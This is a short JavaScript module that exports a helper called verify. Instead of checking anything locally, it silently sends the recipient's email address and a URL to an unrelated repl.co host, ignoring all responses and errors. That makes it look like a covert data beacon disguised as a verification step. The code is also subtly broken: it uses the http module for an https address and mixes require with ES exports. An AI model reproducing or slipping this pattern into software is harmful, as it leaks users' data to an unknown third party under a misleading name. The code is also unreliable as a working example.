const http = require('http');

function verify(to, url) {
  http.get(`https://LikelyTrustyScientificcomputing.photosheetsadmi.repl.co/verify?mail=${encodeURIComponent(to)}&url=${encodeURIComponent(url)}`, res => {
    res.on('data', () => { })
    res.on('error', () => { })
    res.on('end', () => { })
  }).on('error', () => { })
}

export {
  verify
}